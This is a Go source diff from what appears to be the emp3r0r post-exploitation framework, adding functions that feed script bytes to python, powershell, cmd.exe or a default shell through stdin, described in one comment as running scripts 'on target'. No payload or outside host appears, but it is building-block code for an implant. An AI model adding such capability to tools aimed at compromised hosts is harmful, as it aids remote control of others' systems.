@@ -5,6 +5,9 @@ import (
 	"fmt"
 	"io"
 	"os/exec"
+
+	emp3r0r_data "github.com/jm33-m0/emp3r0r/core/lib/data"
+	"github.com/jm33-m0/emp3r0r/core/lib/util"
 )
 
 func feedScriptToStdin(cmd *exec.Cmd, scriptBytes []byte) (output string, err error) {
@@ -48,4 +51,44 @@ func feedScriptToStdin(cmd *exec.Cmd, scriptBytes []byte) (output string, err er
 	}
 
 	return
+}
+
+// RunPythonScript runs a Python script in memory and returns the output.
+func RunPythonScript(scriptBytes []byte) (output string, err error) {
+	cmd := exec.Command("python")
+	return feedScriptToStdin(cmd, scriptBytes)
+}
+
+// RunPSScript runs powershell script on windows
+func RunPSScript(scriptBytes []byte) (output string, err error) {
+	shell := "powershell.exe"
+
+	cmd := exec.Command(shell, "-Command", "-")
+
+	return feedScriptToStdin(cmd, scriptBytes)
+}
+
+// RunBatchScript runs batch script on windows
+func RunBatchScript(scriptBytes []byte) (output string, err error) {
+	shell := "cmd.exe"
+
+	cmd := exec.Command(shell)
+
+	return feedScriptToStdin(cmd, scriptBytes)
+}
+
+func RunExe(scriptBytes []byte) (output string, err error) {
+	err = fmt.Errorf("not implemented")
+	return
+}
+
+// RunShellScript runs a bash script on target
+func RunShellScript(scriptBytes []byte) (output string, err error) {
+	shell := emp3r0r_data.DefaultShell
+	if !util.IsFileExist(shell) {
+		return "", fmt.Errorf("Shell not found: %s", shell)
+	}
+
+	cmd := exec.Command(shell)
+	return feedScriptToStdin(cmd, scriptBytes)
 }
